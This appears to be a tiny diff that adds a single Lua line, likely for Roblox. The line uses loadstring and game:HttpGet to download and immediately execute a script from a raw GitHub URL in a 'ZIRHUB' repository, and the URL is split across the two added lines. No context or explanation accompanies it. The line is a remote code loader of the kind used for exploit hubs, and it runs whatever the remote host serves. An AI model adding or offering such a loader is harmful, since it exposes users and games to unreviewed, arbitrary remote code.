@@ -1,0 +1,2 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/ZIRHUB/ZIRHUB/refs/heads/main/DarkTheme_6905981717984536.
+lua.txt'))()
